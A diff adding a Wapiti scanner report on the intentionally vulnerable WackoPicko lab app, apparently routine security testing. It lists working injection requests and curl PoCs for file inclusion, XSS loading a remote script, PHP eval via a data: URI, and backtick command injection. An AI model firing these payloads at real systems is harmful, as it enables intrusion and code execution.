@@ -1,0 +1,192 @@
+********************************************************************************
+                     Wapiti 3.0.1 - wapiti.sourceforge.net
+                  Report for http://192.168.0.26/WackoPicko/
+              Date of the scan : Thu, 09 Aug 2018 01:39:55 +0000
+                          Scope of the scan : folder
+********************************************************************************
+
+Summary of vulnerabilities :
+----------------------------
+                                                            SQL Injection :   0
+                                                      Blind SQL Injection :   0
+                                                            File Handling :   2
+                                                     Cross Site Scripting :   3
+                                                           CRLF Injection :   0
+                                                       Commands execution :   3
+                                                          Htaccess Bypass :   0
+                                                              Backup file :   0
+                                               Potentially dangerous file :   0
+                                              Server Side Request Forgery :   0
+********************************************************************************
+
+File Handling
+-------------
+Remote inclusion vulnerability via injection in the parameter page
+Evil request:
+    GET /WackoPicko/admin/index.php?page=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
+    Host: 192.168.0.26
+cURL command PoC : "curl "http://192.168.0.26/WackoPicko/admin/index.php?page=http%3A%2F%2Fwww.google.fr%2F%3F""
+
+                                  *   *   *
+
+Remote inclusion vulnerability via injection in the parameter page
+Evil request:
+    POST /WackoPicko/admin/index.php?page=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+cURL command PoC : "curl "http://192.168.0.26/WackoPicko/admin/index.php?page=http%3A%2F%2Fwww.google.fr%2F%3F" -e "http://192.168.0.26/WackoPicko/admin/index.php?page=login" -d "adminname=default&password=letmein""
+
+                                  *   *   *
+
+********************************************************************************
+
+Cross Site Scripting
+--------------------
+XSS vulnerability found via injection in the parameter query
+Evil request:
+    GET /WackoPicko/pictures/search.php?query=%22%2F%3E%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwbjhm7grdrz.js%3E%3C%2Fscript%3E&x=1&y=1 HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/
+cURL command PoC : "curl "http://192.168.0.26/WackoPicko/pictures/search.php?query=%22%2F%3E%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwbjhm7grdrz.js%3E%3C%2Fscript%3E&x=1&y=1" -e "http://192.168.0.26/WackoPicko/""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter comment
+Evil request:
+    POST /WackoPicko/guestbook.php HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/guestbook.php
+    Content-Type: application/x-www-form-urlencoded
+
+    name=default&comment=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fws9u8rjdruz.js%3E%3C%2Fscript%3E
+cURL command PoC : "curl "http://192.168.0.26/WackoPicko/guestbook.php" -e "http://192.168.0.26/WackoPicko/guestbook.php" -d "name=default&comment=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fws9u8rjdruz.js%3E%3C%2Fscript%3E""
+
+                                  *   *   *
+
+Permanent XSS vulnerability found via injection in the parameter comment
+Evil request:
+    POST /WackoPicko/guestbook.php HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/guestbook.php
+    Content-Type: application/x-www-form-urlencoded
+
+    name=default&comment=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fws9u8rjdruz.js%3E%3C%2Fscript%3E
+cURL command PoC : "curl "http://192.168.0.26/WackoPicko/guestbook.php" -e "http://192.168.0.26/WackoPicko/guestbook.php" -d "name=default&comment=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fws9u8rjdruz.js%3E%3C%2Fscript%3E""
+
+                                  *   *   *
+
+********************************************************************************
+
+Commands execution
+------------------
+PHP evaluation via injection in the parameter page
+Evil request:
+    GET /WackoPicko/admin/index.php?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D HTTP/1.1
+    Host: 192.168.0.26
+cURL command PoC : "curl "http://192.168.0.26/WackoPicko/admin/index.php?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D""
+
+                                  *   *   *
+
+PHP evaluation via injection in the parameter page
+Evil request:
+    POST /WackoPicko/admin/index.php?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+cURL command PoC : "curl "http://192.168.0.26/WackoPicko/admin/index.php?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D" -e "http://192.168.0.26/WackoPicko/admin/index.php?page=login" -d "adminname=default&password=letmein""
+
+                                  *   *   *
+
+Blind command execution via injection in the parameter password
+Evil request:
+    POST /WackoPicko/passcheck.php HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/passcheck.php
+    Content-Type: application/x-www-form-urlencoded
+
+    password=a%60sleep%2060%60
+cURL command PoC : "curl "http://192.168.0.26/WackoPicko/passcheck.php" -e "http://192.168.0.26/WackoPicko/passcheck.php" -d "password=a%60sleep%2060%60""
+
+                                  *   *   *
+
+********************************************************************************
+
+Summary of anomalies :
+----------------------
+                                                    Internal Server Error :   6
+                                                     Resource consumption :   1
+********************************************************************************
+
+Internal Server Error
+---------------------
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter page
+Evil request:
+    GET /WackoPicko/admin/index.php?page=%3Benv HTTP/1.1
+    Host: 192.168.0.26
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter page
+Evil request:
+    POST /WackoPicko/admin/index.php?page=%3Benv HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter page
+Evil request:
+    GET /WackoPicko/admin/index.php?page=%C2%BF%27%22%28 HTTP/1.1
+    Host: 192.168.0.26
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter page
+Evil request:
+    POST /WackoPicko/admin/index.php?page=%C2%BF%27%22%28 HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter page
+Evil request:
+    GET /WackoPicko/admin/index.php?page=sleep%287%29%231 HTTP/1.1
+    Host: 192.168.0.26
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter page
+Evil request:
+    POST /WackoPicko/admin/index.php?page=sleep%287%29%231 HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+
+                                  *   *   *
+
+********************************************************************************
+
+Resource consumption
+--------------------
+The request timed out while attempting to inject a payload in the parameter date
+Evil request:
+    GET /WackoPicko/calendar.php?date=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
+    Host: 192.168.0.26
+
+                                  *   *   *
+
+********************************************************************************
